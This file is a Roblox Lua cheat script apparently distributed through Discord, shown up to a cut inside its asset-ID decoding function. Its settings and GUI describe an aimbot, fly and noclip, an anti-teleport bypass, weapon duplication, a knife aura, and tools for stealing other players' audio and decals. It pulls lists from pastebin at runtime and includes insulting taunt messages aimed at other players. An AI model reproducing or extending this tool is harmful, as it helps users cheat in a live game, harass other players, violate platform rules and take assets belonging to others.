--[[                      _      ______  __
                         | |     | ___ \ \ \
 _ __   __ ___      _____| |___  | |_/ /  | |
| '_ \ / _` \ \ /\ / / _ \ / __| | ___ \  | |
| |_) | (_| |\ V  V /  __/ \__ \ | |_/ /  | |
| .__/ \__,_| \_/\_/ \___|_|___/ \____/   | |
| |                                      /_/
|_|

pawel630#0001 | 902665181816033290
]]
--//Instances
local start = tick()
local ScreenGui = Instance.new"ScreenGui"
local MainFrame = Instance.new"Frame"
local Frame = Instance.new"Frame"
local TextLabel = Instance.new"TextLabel"
local TextButton = Instance.new"TextButton"
local TextButton2 = Instance.new"TextButton"
local TextBox = Instance.new"TextBox"
local TextBox2 = Instance.new"TextBox"

--//Command List Gui
local Main = Instance.new"Frame"
local ScrollBar = Instance.new"ScrollingFrame"
local CommandBox = Instance.new"TextLabel"
local Close = Instance.new"TextButton"
local CmdFrame = Instance.new"Frame"

--//Shotty Skins Gui
local Frame2 = Instance.new"Frame"
local Union1 = Instance.new"TextButton"
local Union2 = Instance.new"TextButton"
local Union3 = Instance.new"TextButton"
local Union5 = Instance.new"TextButton"
local Union4 = Instance.new"TextButton"
local Red = Instance.new"TextButton"
local Purple = Instance.new"TextButton"
local Orange = Instance.new"TextButton"
local Pink = Instance.new"TextButton"
local Yellow = Instance.new"TextButton"
local Black = Instance.new"TextButton"
local Green = Instance.new"TextButton"
local White = Instance.new"TextButton"
local Blue = Instance.new"TextButton"
local Space = Instance.new"ImageButton"
local Neon = Instance.new"TextButton"
local Corroded = Instance.new"TextButton"
local Granite = Instance.new"TextButton"
local Glass = Instance.new"TextButton"
local Material = Instance.new"TextBox"
local Frame3 = Instance.new"Frame"
local Custom = Instance.new"TextBox"
local Preview = Instance.new"ImageButton"
local All = Instance.new"TextButton"
local Apply = Instance.new"TextButton"

--//Services
local plrs = game:GetService"Players"
local uis = game:GetService"UserInputService"
local rep = game:GetService"ReplicatedStorage"
local mps = game:GetService"MarketplaceService"
local http = game:GetService"HttpService"
local light = game:GetService"Lighting"
local tp = game:GetService"TeleportService"
local run = game:GetService"RunService"
local sg = game:GetService"StarterGui"

--//Variables
local plr = plrs.LocalPlayer
local Mouse = plr:GetMouse()
local CF = CFrame.new
local heart = run.Heartbeat
local AutoID
local noclipcon
local last
local chatspypos
local aimtarget
local camtarget
local daycon
local Time
local FogS
local FogE
local rainbowbulletscon
local rainbowtrailscon
local viewcon
local viewplayer
local shotscon

--//Booleans
local ONspin = false
local ONshoot = false
local ONaim = false
local ONcamlock = false
local ONitemesp = false
ONautoplay = false
ONrespawn = false
ONgunanims = true
ONspeed = false
ONblink = true
ONinfinitejump = true
ONrainbowbullets = true
ONrainbowtrails = true
local ONunlockall = false
local ONlockall = false
ONkillphrase = true
local ONay = false
ONsavetools = true
ONairwalk = true
local ONplatform = false
local ONknifeaura = false
ONknifeauravisualizer = false
ONbfg = false
ONdualbfg = false
ONclaws = false
ONsuicidegun = false
ONmecha = false
local ONturrets = false
local ONhorse = false
local ONhalo = false
local ONbypass = false
ONbarhide = true
ONsorting = true
ONseats = true
ONautoreset = false
local ONbayonet = false
ONnostop = true
local ONnoclip = false
ONkosesp = true
local ONbuyeresp = true
local ONautostomp = false
ONstompspam = true
local ONguis = false
local ONshield = false
local ONsnow = false
ONlegit = false
ONwalk = true
ONteleport = true
ONdeathnote = true
local ONfly = false
local ONmaphide = false
local ONtper = false
local ONhitmarker = true
local ONtpbypass = false

local state = false
local split = true
local value3 = false
local sprinting = false
local crouching = false
local taunting = false
local disabled = false
local Jumping = false
local EHold = false
local tauntdebounce = false
local teleporting = false
local stompvalue = false
local loop = false

--//Integers
local overlord = 120476167
local dupeamount = 0
local stomprange = 15
local value = 0
local value2 = 0
local turretsvalue = 1
local turretsvalue2 = 0.18
local turretsheight = 2.5
local turretsoffset = 2.98
local halooffset = -1
local turnspeed = 20
local offset = 2.5
local dualbfgvalue = 1
local lasttaunt
local sens = 4
speed = 100
jumppower = 37.5
flyspeed = 5
defaultaimbot = 1
aimvelocity = 5
local blinkspeed = 4
local SpawnPos = 0
local colorNum = 1

--//Strings
killphrase = ""
note = ""
local prefix = "."
local zeros = string.rep("%30", 625)
local white = string.rep(" ", 6384)
local white2 = string.rep(" ", 4256)
local CurrentUnion = "Union1"
local koslist = game:HttpGet"https://pastebin.com/raw/YPZRxXid"
local art = [[ 
                          _      ______  __
                         | |     | ___ \ \ \
 _ __   __ ___      _____| |___  | |_/ /  | |
| '_ \ / _` \ \ /\ / / _ \ / __| | ___ \  | |
| |_) | (_| |\ V  V /  __/ \__ \ | |_/ /  | |
| .__/ \__,_| \_/\_/ \___|_|___/ \____/   | |
| |                                      /_/
|_|

https://discord.gg/trkuPnVXuu - Join you skid
]]

--//Tables
local TAUNTS = {
	{2765231211, "Shut up emo"},
	{2765231844, "Ez poser get rekt go back to alabama"},
	{2765230937, "Wait a second, I think I smell trash gangers. Yo sad bfg got patched"},
	{2765230590, "Dude you're trash lol get rekt kid Xdddd"},
	{2765251128, "Ok so which one of y'all faxked my cousin"},
	{2765249961, "What is that? Do I hear heII_ish's audios? Hold up boys lemme get my shotgun Xdddddd"},
	{2765249450, "You've got leaked audios, poser!"}
}
local itemnames = {
	["ammo"] = "Buy Ammo | $25",
	["glock"] = "Glock | $200",
	["uzi"] = "Uzi | $150",
	["sawed"] = "Sawed Off | $150",
	["pipe"] = "Pipe | $100",
	["machete"] = "Machete | $70",
	["bat"] = "Bat | $50",
	["golf"] = "Golf Club | $70",
	["bottle"] = "Bottle | $50",
	["lockpick"] = "Lockpick | $25",
	["spray"] = "Spray | $20",
	["burger"] = "Burger | $15",
	["drink"] = "Drink | $15",
	["chicken"] = "Chicken | $12",
	["energy"] = "Greenbull | $12"
}
local anims = {
	["/e dab"] = 526812070,
	["/e lay"] = 526815097,
	["/e unlay"] = 526815097,
	["/e sit"] = 526819729,
	["/e unsit"] = 526819729,
	["/e sit2"] = 526120771,
	["/e unsit2"] = 526120771,
	["/e backflip"] = 363364837,
	["/e spit"] = 362709075,
	["/e pushups"] = 526813828,
	["/e unpushups"] = 526813828,
	["/e situps"] = 526814775,
	["/e unsitups"] = 526814775,
	["/e chill"] = 526821274,
	["/e unchill"] = 526821274,
	["/e kick"] = 376851671,
}
local rColors = {
	"Really red",
	"Deep orange",
	"New Yeller",
	"Lime green",
	"Cyan",
	"Royal purple",
	"Pink"
}
local Colors = {
	{"Red", "Really red"},
	{"Orange", "Deep orange"},
	{"Yellow", "New Yeller"},
	{"Green", "Forest green"},
	{"Blue", "Really blue"},
	{"Purple", "Royal purple"},
	{"Pink", "Pink"},
	{"Black", "Really black"},
	{"White", "Institutional white"}
}
local Materials = {
	{"Neon", "Neon"},
	{"Corroded", "Corroded Metal"},
	{"Glass", "Glass"},
	{"Granite", "Granite"}
}
local Melees = {"Punch", "Knife", "Pipe", "Machete", "Bat", "Stop Sign", "Crowbar", "Katana"}
local DupeList = {"Shotty", "Glock", "Sawed Off", "Uzi"}
local Rangelist = {
	["Glock"] = 145,
	["Shotty"] = 50
}
local Doors = {}
local carseats = {}
local Parts = {}
local items = {}
order = {"Tool", "Tool", "Tool", "Tool"}
local st = {
	{"Punch"},
	{"Knife"},
	{"Jutsu", 1082540},
	{"BoomBox", 1159109},
	{"Glock", 1378459},
	{"Pipe", 1378577},
	{"Spray", 1541433},
	{"Lockpick (4)", 1671301},
	{"Shotty", 2716073},
	{"Sign", 5058091}
}
local boomboxList = {
	["BoomBox"] = true,
	["Boombox"] = true,
	["SuperFlyGoldBoombox"] = true,
	["DualGoldenSuperFlyBoombox"] = true,
	["BoomboxGearThree"] = true,
	["Radio"] = true,
	["BoxModel"] = true,
	["BoomboxModel"] = true
}
local connections2 = {}
local connections3 = {}
local connections4 = {}

--//Keybinds
Keys = {
	["pawelCmdbar"] = "Semicolon",
	["pawelSelect"] = "E",
	["pawelSuicide"] = "C",
	["pawelFastDrag"] = "R",
	["pawelDecal"] = "B",
	["pawelBlink"] = "LeftShift",
	["pawelAimbot"] = "X",
	["pawelTaunt"] = "T",
	["pawelAirwalk"] = "Q",
	["pawelFly"] = "F",
	["pawelNoclip"] = "G",
	["pawelCamos"] = "V",
	["pawelNightVision"] = "N",
	["pawelGuis"] = "P",
	["pawelHiderDelete"] = "X",
	["pawelHiderUndo"] = "C",
	["pawelHiderUndoAll"] = "V"
}
commandKeys = {}

--//Settings File
local Settings = [[--//INFO
-- Here you can edit commands that are on by default, keybinds and your inventory order for the inventory sorter
-- DELETE THIS FILE TO RESTORE DEFAULTS
-- Pawels B)

order = {"Tool", "Tool", "Tool", "Tool"} -- Inventory order (Case sensitive)

--//Commands
ONautoplay = false
ONrespawn = false
ONgunanims = true
ONspeed = false
ONblink = true
speed = 150
jumppower = 37.5
flyspeed = 5
aimvelocity = 5
defaultaimbot = 1 -- 1 stops shooting after the player dies, 2 doesn't stop until you turn it off, 3 is aimlock
ONinfinitejump = true
ONrainbowbullets = true
ONrainbowtrails = true
ONkillphrase = false
killphrase = ""
ONsavetools = true
ONairwalk = true
ONknifeauravisualizer = false
ONbfg = false
ONbarhide = true -- Hides the 3 bars at the bottom Health, KO and Stamina when their values aren't descending
ONsorting = true -- Inventory sorting
ONseats = true
ONautoreset = false
ONnostop = true -- Walkshoot
ONkosesp = true
ONstompspam = true
ONlegit = false
ONwalk = true -- Walk while knocked
ONteleport = true -- Teleport mode (false is simple teleport and true is better teleport which can break sometimes but therefore bypasses anti tp)
ONdeathnote = false
note = ""

--//Keybinds
Keys["pawelCmdbar"] = "Semicolon"
Keys["pawelSelect"] = "E" -- Keybind for selecting players for the audio stealer
Keys["pawelSuicide"] = "C" -- Keybind for killing yourself
Keys["pawelFastDrag"] = "R"
Keys["pawelDecal"] = "B" -- Keybind for the decal stealer
Keys["pawelBlink"] = "LeftShift" -- Keybind for blink (Speed)
Keys["pawelAimbot"] = "X" -- Keybind for aimbotting player that you're pointing at
Keys["pawelTaunt"] = "T"
Keys["pawelAirwalk"] = "Q"
Keys["pawelFly"] = "F"
Keys["pawelNoclip"] = "G"
Keys["pawelCamos"] = "V" -- Keybind for toggling the shotty camo gui
Keys["pawelNightVision"] = "N"
Keys["pawelGuis"] = "P" -- Keybind for toggling the low gfx and mute guis

--//Ctrl Combos (Hold CTRL then press)
Keys["pawelHiderDelete"] = "X" -- Keybind for hiding parts
Keys["pawelHiderUndo"] = "C" -- Keybind for undoing part hides
Keys["pawelHiderUndoAll"] = "V" -- Keybind for undoing all part hides]]

--//Create The GUI
ScreenGui.Parent = game.CoreGui
ScreenGui.Name = "Pawels"

MainFrame.Parent = ScreenGui
MainFrame.Name = "MainFrame"
MainFrame.Active = true
MainFrame.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
MainFrame.BackgroundTransparency = 0
MainFrame.BorderSizePixel = 0
MainFrame.Position = UDim2.new(1, -400, 0.5, 55-25)
MainFrame.Selectable = true
MainFrame.Size = UDim2.new(0, 400, 0, 50)
MainFrame.Draggable = true

Frame.Parent = ScreenGui
Frame.Active = true
Frame.BackgroundColor3 = Color3.new(0.239216, 0.239216, 0.239216)
Frame.BackgroundTransparency = 0
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0, 0, 0.5, -25)
Frame.Selectable = true
Frame.Size = UDim2.new(1, 0, 0, 50)
Frame.Visible = false

TextBox2.Parent = Frame
TextBox2.BackgroundColor3 = Color3.fromRGB(0, 191, 255)
TextBox2.BackgroundTransparency = 0.2
TextBox2.BorderColor3 = Color3.new(27, 42, 53)
TextBox2.BorderSizePixel = 0
TextBox2.Position = UDim2.new(0, 0, 0.025, 5)
TextBox2.Size = UDim2.new(1, 0, 1, -12)
TextBox2.Font = Enum.Font.Highway
TextBox2.Text = ""
TextBox2.TextColor3 = Color3.new(1, 1, 1)
TextBox2.TextScaled = true

TextLabel.Parent = MainFrame
TextLabel.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
TextLabel.BorderColor3 = Color3.new(0, 0, 0)
TextLabel.Position = UDim2.new(0.241, 0, 0.1, 0)
TextLabel.Size = UDim2.new(0, 250, 0, 40)
TextLabel.Font = Enum.Font.Highway
TextLabel.Text = "ID"
TextLabel.TextColor3 = Color3.new(1, 1, 1)
TextLabel.TextSize = 14

TextButton.Parent = MainFrame
TextButton.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
TextButton.BorderColor3 = Color3.new(0, 0, 0)
TextButton.Position = UDim2.new(0.011, 0, 0.1, 0)
TextButton.Size = UDim2.new(0, 46.5, 0, 40)
TextButton.Font = Enum.Font.Highway
TextButton.Text = "Steal"
TextButton.TextColor3 = Color3.new(1, 1, 1)
TextButton.TextSize = 19

TextButton2.Parent = MainFrame
TextButton2.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
TextButton2.BorderColor3 = Color3.new(0, 0, 0)
TextButton2.Position = UDim2.new(0.874, 0, 0.1, 0)
TextButton2.Size = UDim2.new(0, 46.5, 0, 40)
TextButton2.Font = Enum.Font.Highway
TextButton2.Text = "Play"
TextButton2.TextColor3 = Color3.new(1, 1, 1)
TextButton2.TextSize = 19

TextBox.Parent = MainFrame
TextBox.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
TextBox.BorderColor3 = Color3.new(0, 0, 0)
TextBox.Position = UDim2.new(0.122, 0, 0.1, 0)
TextBox.Size = UDim2.new(0, 46.5, 0, 40)
TextBox.Font = Enum.Font.Highway
TextBox.Text = "Player"
TextBox.TextColor3 = Color3.new(1, 1, 1)
TextBox.TextScaled = true

--//Command List Gui
Main.Name = "Main"
Main.Parent = ScreenGui
Main.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
Main.BorderColor3 = Color3.new(1, 1, 1)
Main.BorderSizePixel = 3
Main.Position = UDim2.new(0.5, -1021/2, 0.5, -324/2)
Main.Size = UDim2.new(0, 1021, 0, 324)
Main.Visible = false
Main.Active = true

ScrollBar.Name = "ScrollBar"
ScrollBar.Parent = Main
ScrollBar.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
ScrollBar.BackgroundTransparency = 1
ScrollBar.BorderColor3 = Color3.new(1, 1, 1)
ScrollBar.BorderSizePixel = 0
ScrollBar.Position = UDim2.new(-0.0205690265, 0, 0, 0)
ScrollBar.Size = UDim2.new(0, 1042, 0, 324)
ScrollBar.CanvasSize = UDim2.new(0, 0, 6.45, 0)

CommandBox.Name = "CommandBox"
CommandBox.Parent = ScrollBar
CommandBox.BackgroundColor3 = Color3.new(1, 1, 1)
CommandBox.BackgroundTransparency = 1
CommandBox.BorderSizePixel = 0
CommandBox.Position = UDim2.new(0.029, 0, 0, 0)
CommandBox.Size = UDim2.new(0, 336, 0, 2080)
CommandBox.Font = Enum.Font.Highway
CommandBox.Text = game:HttpGet"https://pastebin.com/raw/FjXP1kDs"
CommandBox.TextColor3 = Color3.new(1, 1, 1)
CommandBox.TextSize = 15
CommandBox.TextXAlignment = Enum.TextXAlignment.Left

Close.Name = "Close"
Close.Parent = Main
Close.BackgroundColor3 = Color3.new(1, 0.227451, 0.227451)
Close.BorderColor3 = Color3.new(1, 1, 1)
Close.BorderSizePixel = 3
Close.Position = UDim2.new(0.971515238, 0, -0.107414991, 0)
Close.Size = UDim2.new(0, 29, 0, 32)
Close.Font = Enum.Font.Highway
Close.Text = "X"
Close.TextColor3 = Color3.new(1, 1, 1)
Close.TextScaled = true
Close.TextSize = 14
Close.TextWrapped = true

CmdFrame.Name = "CmdFrame"
CmdFrame.Parent = Main
CmdFrame.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
CmdFrame.BorderColor3 = Color3.new(1, 1, 1)
CmdFrame.BorderSizePixel = 3
CmdFrame.Position = UDim2.new(0, 0, -0.107414998, 0)
CmdFrame.Size = UDim2.new(0, 991, 0, 32)

--//Shotty Skins Gui
Frame2.Name = "Frame2"
Frame2.Parent = ScreenGui
Frame2.BackgroundColor3 = Color3.new(0.239216, 0.239216, 0.239216)
Frame2.BorderSizePixel = 0
Frame2.Position = UDim2.new(0.5, -470/2, 0.5, -395/2)
Frame2.Size = UDim2.new(0, 470, 0, 395)
Frame2.Visible = false
Frame2.Draggable = true
Frame2.Active = true

Union1.Name = "Union1"
Union1.Parent = Frame2
Union1.BackgroundColor3 = Color3.new(0.137255, 0.137255, 0.137255)
Union1.BorderColor3 = Color3.new(1, 1, 1)
Union1.BorderSizePixel = 0
Union1.Position = UDim2.new(0.0299999993, 0, 0.0318101272, 0)
Union1.Size = UDim2.new(0, 80, 0, 80)
Union1.Font = Enum.Font.Highway
Union1.Text = "Magazine"
Union1.TextColor3 = Color3.new(1, 1, 1)
Union1.TextSize = 18

Union2.Name = "Union2"
Union2.Parent = Frame2
Union2.BackgroundColor3 = Color3.new(0.137255, 0.137255, 0.137255)
Union2.BorderColor3 = Color3.new(1, 1, 1)
Union2.BorderSizePixel = 0
Union2.Position = UDim2.new(0.218872339, 0, 0.0318101272, 0)
Union2.Size = UDim2.new(0, 80, 0, 80)
Union2.Font = Enum.Font.Highway
Union2.Text = "Reciever"
Union2.TextColor3 = Color3.new(1, 1, 1)
Union2.TextSize = 18

Union3.Name = "Union3"
Union3.Parent = Frame2
Union3.BackgroundColor3 = Color3.new(0.137255, 0.137255, 0.137255)
Union3.BorderColor3 = Color3.new(1, 1, 1)
Union3.BorderSizePixel = 0
Union3.Position = UDim2.new(0.414000005, 0, 0.0318101272, 0)
Union3.Size = UDim2.new(0, 80, 0, 80)
Union3.Font = Enum.Font.Highway
Union3.Text = "Fore-end"
Union3.TextColor3 = Color3.new(1, 1, 1)
Union3.TextSize = 18

Union5.Name = "Union5"
Union5.Parent = Frame2
Union5.BackgroundColor3 = Color3.new(0.137255, 0.137255, 0.137255)
Union5.BorderColor3 = Color3.new(1, 1, 1)
Union5.BorderSizePixel = 0
Union5.Position = UDim2.new(0.796872377, 0, 0.0318101272, 0)
Union5.Size = UDim2.new(0, 80, 0, 80)
Union5.Font = Enum.Font.Highway
Union5.Text = "Barrel"
Union5.TextColor3 = Color3.new(1, 1, 1)
Union5.TextSize = 18

Union4.Name = "Union4"
Union4.Parent = Frame2
Union4.BackgroundColor3 = Color3.new(0.137255, 0.137255, 0.137255)
Union4.BorderColor3 = Color3.new(1, 1, 1)
Union4.BorderSizePixel = 0
Union4.Position = UDim2.new(0.604872346, 0, 0.0318101272, 0)
Union4.Size = UDim2.new(0, 80, 0, 80)
Union4.Font = Enum.Font.Highway
Union4.Text = "Grip"
Union4.TextColor3 = Color3.new(1, 1, 1)
Union4.TextSize = 18

Red.Name = "Red"
Red.Parent = Frame2
Red.BackgroundColor3 = Color3.new(0.137255, 0.137255, 0.137255)
Red.BorderColor3 = Color3.new(1, 1, 1)
Red.BorderSizePixel = 0
Red.Position = UDim2.new(0.0299999993, 0, 0.2763924, 0)
Red.Size = UDim2.new(0, 80, 0, 80)
Red.Font = Enum.Font.Highway
Red.Text = "Red"
Red.TextColor3 = Color3.new(0.666667, 0, 0)
Red.TextSize = 18

Purple.Name = "Purple"
Purple.Parent = Frame2
Purple.BackgroundColor3 = Color3.new(0.137255, 0.137255, 0.137255)
Purple.BorderColor3 = Color3.new(1, 1, 1)
Purple.BorderSizePixel = 0
Purple.Position = UDim2.new(0.0299999993, 0, 0.517911375, 0)
Purple.Size = UDim2.new(0, 80, 0, 80)
Purple.Font = Enum.Font.Highway
Purple.Text = "Purple"
Purple.TextColor3 = Color3.new(0.34902, 0, 0.52549)
Purple.TextSize = 18

Orange.Name = "Orange"
Orange.Parent = Frame2
Orange.BackgroundColor3 = Color3.new(0.137255, 0.137255, 0.137255)
Orange.BorderColor3 = Color3.new(1, 1, 1)
Orange.BorderSizePixel = 0
Orange.Position = UDim2.new(0.219361708, 0, 0.2763924, 0)
Orange.Size = UDim2.new(0, 80, 0, 80)
Orange.Font = Enum.Font.Highway
Orange.Text = "Orange"
Orange.TextColor3 = Color3.new(1, 0.333333, 0)
Orange.TextSize = 18

Pink.Name = "Pink"
Pink.Parent = Frame2
Pink.BackgroundColor3 = Color3.new(0.137255, 0.137255, 0.137255)
Pink.BorderColor3 = Color3.new(1, 1, 1)
Pink.BorderSizePixel = 0
Pink.Position = UDim2.new(0.219361708, 0, 0.517911375, 0)
Pink.Size = UDim2.new(0, 80, 0, 80)
Pink.Font = Enum.Font.Highway
Pink.Text = "Pink"
Pink.TextColor3 = Color3.new(1, 0.333333, 1)
Pink.TextSize = 18

Yellow.Name = "Yellow"
Yellow.Parent = Frame2
Yellow.BackgroundColor3 = Color3.new(0.137255, 0.137255, 0.137255)
Yellow.BorderColor3 = Color3.new(1, 1, 1)
Yellow.BorderSizePixel = 0
Yellow.Position = UDim2.new(0.412978768, 0, 0.2763924, 0)
Yellow.Size = UDim2.new(0, 80, 0, 80)
Yellow.Font = Enum.Font.Highway
Yellow.Text = "Yellow"
Yellow.TextColor3 = Color3.new(1, 1, 0)
Yellow.TextSize = 18

Black.Name = "Black"
Black.Parent = Frame2
Black.BackgroundColor3 = Color3.new(0.137255, 0.137255, 0.137255)
Black.BorderColor3 = Color3.new(1, 1, 1)
Black.BorderSizePixel = 0
Black.Position = UDim2.new(0.412978768, 0, 0.517911375, 0)
Black.Size = UDim2.new(0, 80, 0, 80)
Black.Font = Enum.Font.Highway
Black.Text = "Black"
Black.TextColor3 = Color3.new(0, 0, 0)
Black.TextSize = 18

Green.Name = "Green"
Green.Parent = Frame2
Green.BackgroundColor3 = Color3.new(0.137255, 0.137255, 0.137255)
Green.BorderColor3 = Color3.new(1, 1, 1)
Green.BorderSizePixel = 0
Green.Position = UDim2.new(0.604468048, 0, 0.2763924, 0)
Green.Size = UDim2.new(0, 80, 0, 80)
Green.Font = Enum.Font.Highway
Green.Text = "Green"
Green.TextColor3 = Color3.new(0, 0.666667, 0)
Green.TextSize = 18

White.Name = "White"
White.Parent = Frame2
White.BackgroundColor3 = Color3.new(0.137255, 0.137255, 0.137255)
White.BorderColor3 = Color3.new(1, 1, 1)
White.BorderSizePixel = 0
White.Position = UDim2.new(0.604468048, 0, 0.517911375, 0)
White.Size = UDim2.new(0, 80, 0, 80)
White.Font = Enum.Font.Highway
White.Text = "White"
White.TextColor3 = Color3.new(1, 1, 1)
White.TextSize = 18

Blue.Name = "Blue"
Blue.Parent = Frame2
Blue.BackgroundColor3 = Color3.new(0.137255, 0.137255, 0.137255)
Blue.BorderColor3 = Color3.new(1, 1, 1)
Blue.BorderSizePixel = 0
Blue.Position = UDim2.new(0.795957446, 0, 0.2763924, 0)
Blue.Size = UDim2.new(0, 80, 0, 80)
Blue.Font = Enum.Font.Highway
Blue.Text = "Blue"
Blue.TextColor3 = Color3.new(0, 0, 1)
Blue.TextSize = 18

Space.Name = "Space"
Space.Parent = Frame2
Space.BackgroundColor3 = Color3.new(0.137255, 0.137255, 0.137255)
Space.BorderColor3 = Color3.new(1, 1, 1)
Space.BorderSizePixel = 0
Space.Position = UDim2.new(0.795872331, 0, 0.517911375, 0)
Space.Size = UDim2.new(0, 80, 0, 80)
Space.Image = "rbxassetid://1172930814"

Neon.Name = "Neon"
Neon.Parent = Frame2
Neon.BackgroundColor3 = Color3.new(0.137255, 0.137255, 0.137255)
Neon.BorderColor3 = Color3.new(1, 1, 1)
Neon.BorderSizePixel = 0
Neon.Position = UDim2.new(0.0299999993, 0, 0.764999986, 0)
Neon.Size = UDim2.new(0, 80, 0, 80)
Neon.Font = Enum.Font.Highway
Neon.Text = "Neon"
Neon.TextColor3 = Color3.new(1, 1, 1)
Neon.TextSize = 18

Corroded.Name = "Corroded"
Corroded.Parent = Frame2
Corroded.BackgroundColor3 = Color3.new(0.137255, 0.137255, 0.137255)
Corroded.BorderColor3 = Color3.new(1, 1, 1)
Corroded.BorderSizePixel = 0
Corroded.Position = UDim2.new(0.219361708, 0, 0.764999986, 0)
Corroded.Size = UDim2.new(0, 80, 0, 80)
Corroded.Font = Enum.Font.Highway
Corroded.Text = "Corroded"
Corroded.TextColor3 = Color3.new(1, 1, 1)
Corroded.TextSize = 18
Corroded.TextWrapped = true

Granite.Name = "Granite"
Granite.Parent = Frame2
Granite.BackgroundColor3 = Color3.new(0.137255, 0.137255, 0.137255)
Granite.BorderColor3 = Color3.new(1, 1, 1)
Granite.BorderSizePixel = 0
Granite.Position = UDim2.new(0.604468048, 0, 0.764999986, 0)
Granite.Size = UDim2.new(0, 80, 0, 80)
Granite.Font = Enum.Font.Highway
Granite.Text = "Granite"
Granite.TextColor3 = Color3.new(1, 1, 1)
Granite.TextSize = 18

Glass.Name = "Glass"
Glass.Parent = Frame2
Glass.BackgroundColor3 = Color3.new(0.137255, 0.137255, 0.137255)
Glass.BorderColor3 = Color3.new(1, 1, 1)
Glass.BorderSizePixel = 0
Glass.Position = UDim2.new(0.412978768, 0, 0.764999986, 0)
Glass.Size = UDim2.new(0, 80, 0, 80)
Glass.Font = Enum.Font.Highway
Glass.Text = "Glass"
Glass.TextColor3 = Color3.new(1, 1, 1)
Glass.TextSize = 18

Material.Name = "Material"
Material.Parent = Frame2
Material.BackgroundColor3 = Color3.new(0.137255, 0.137255, 0.137255)
Material.BorderSizePixel = 0
Material.Position = UDim2.new(0.796000004, 0, 0.764999986, 0)
Material.Size = UDim2.new(0, 80, 0, 80)
Material.Font = Enum.Font.Highway
Material.Text = "Name"
Material.TextColor3 = Color3.new(1, 1, 1)
Material.TextSize = 18

Frame3.Name = "Frame3"
Frame3.Parent = Frame2
Frame3.BackgroundColor3 = Color3.new(0.137255, 0.137255, 0.137255)
Frame3.BorderSizePixel = 0
Frame3.Position = UDim2.new(1, 0, 0, 0)
Frame3.Size = UDim2.new(0, 94, 1, 0)

Custom.Name = "Custom"
Custom.Parent = Frame3
Custom.BackgroundColor3 = Color3.new(0.239216, 0.239216, 0.239216)
Custom.BorderSizePixel = 0
Custom.Position = UDim2.new(0.0729999989, 0, 0.276781172, 0)
Custom.Size = UDim2.new(0, 80, 0, 80)
Custom.Font = Enum.Font.Highway
Custom.Text = "ID"
Custom.TextColor3 = Color3.new(1, 1, 1)
Custom.TextSize = 18

Preview.Name = "Preview"
Preview.Parent = Frame3
Preview.BackgroundColor3 = Color3.new(0.239216, 0.239216, 0.239216)
Preview.BorderSizePixel = 0
Preview.Position = UDim2.new(0.0729999989, 0, 0.516980648, 0)
Preview.Size = UDim2.new(0, 80, 0, 80)
Preview.Image = "rbxassetid://924320031"

All.Name = "All"
All.Parent = Frame3
All.BackgroundColor3 = Color3.new(0.239216, 0.239216, 0.239216)
All.BorderColor3 = Color3.new(1, 1, 1)
All.BorderSizePixel = 0
All.Position = UDim2.new(0.0734680966, 0, 0.0345311686, 0)
All.Size = UDim2.new(0, 80, 0, 80)
All.Font = Enum.Font.Highway
All.Text = "All"
All.TextColor3 = Color3.new(1, 1, 1)
All.TextSize = 18

Apply.Name = "Apply"
Apply.Parent = Frame3
Apply.BackgroundColor3 = Color3.new(0.239216, 0.239216, 0.239216)
Apply.BorderColor3 = Color3.new(1, 1, 1)
Apply.BorderSizePixel = 0
Apply.Position = UDim2.new(0.0734680966, 0, 0.763645113, 0)
Apply.Size = UDim2.new(0, 80, 0, 80)
Apply.Font = Enum.Font.Highway
Apply.Text = "Apply"
Apply.TextColor3 = Color3.new(1, 1, 1)
Apply.TextSize = 18

if game.PlaceId == 455366377 or game.PlaceId == 4669040 then
	Shots = plr.PlayerGui.HUD:FindFirstChild"Ammo":Clone()
	Shots = plr.PlayerGui.HUD:FindFirstChild"Ammo":Clone()
	Shots.Parent = plr.PlayerGui.HUD
	Shots.Name = "Shots"
	Shots.Text = ""
	Shots.Position = plr.PlayerGui.HUD:FindFirstChild"Ammo".Position + UDim2.new(0, 0, 0.03, 0)
end

--//Functions
function Notify(title, text, duration, icon, callback, button1, button2)
	game.StarterGui:SetCore("SendNotification", {Title = title, Text = text, Icon = icon, Duration = duration, Callback = callback, Button1 = button1, Button2 = button2})
end

--//Get HumanoidRootPart
function root()
	return plr.Character:WaitForChild("HumanoidRootPart", 20)
end

--//Get player
local function getPlayer(TargetPlayer)
	if TargetPlayer ~= "" then
		for i, p in pairs(plrs:GetPlayers()) do
			if p.Name:lower():sub(1, #TargetPlayer) == TargetPlayer and p ~= plr then
				return p
			end
		end
	end
	return false
end

--//Decoder Functions
function decodeChar(hex)
	return string.char(tonumber(hex, 16))
end

function percentDecode(str)
	local output, t = string.gsub(str,"%%(%x%x)", decodeChar)
	return output
end

local function fromHex(str)
	if string.find(str, "0x") then
		return tostring(tonumber(str))
	else
		return tostring(tonumber("0x".. str))
	end
end

--//Decode Audio
function crack(input)
	local id = input:lower():gsub(" ", ""):gsub("	", ""):gsub("rbxassetid://", ""):gsub("%%3d", ""):gsub("€",""):gsub("Ž", ""):gsub("ž",""):gsub("â","")
	local assetType
	local newid = ""

	--//Cypher X stuff
	local e = string.find(percentDecode(id):lower(), "&assetversionid=\n\n%d")

	if e then
		id = percentDecode(id):lower():sub(e, id:len()):gsub("\n", "")
	end

	--//Remove Baits
	id = id:gsub("&%%26[%%%w=]+", ""):gsub("%%26[%%%w=]+", "")

	--//Percent Decode
	id = percentDecode(id):lower()

	--//Find first valid
	local a, b = string.find(id, "&assetversionid=(%d)")
	local c, d = string.find(id, "&userassetid=(%d)")
	--local a, b = string.find(id, "[^&]&assetversionid=(%d)")
	--local c, d = string.find(id, "[^&]&userassetid=(%d)")

	if c then
		assetType = "userassetid"
		id = id:sub(c)
	elseif a then
		assetType = "assetversionid"
		id = id:sub(a)
	end

	--//Decode
	if assetType == "assetversionid" or assetType == "userassetid" then
		--//Unicode Decode
		local idfound = false
		local val = 0

		for i in string.gmatch(id, "(.)") do
			val = val + 1

			--//Check if "id="
			if i == "=" and id:sub(val - 1, val - 1) == "d" then
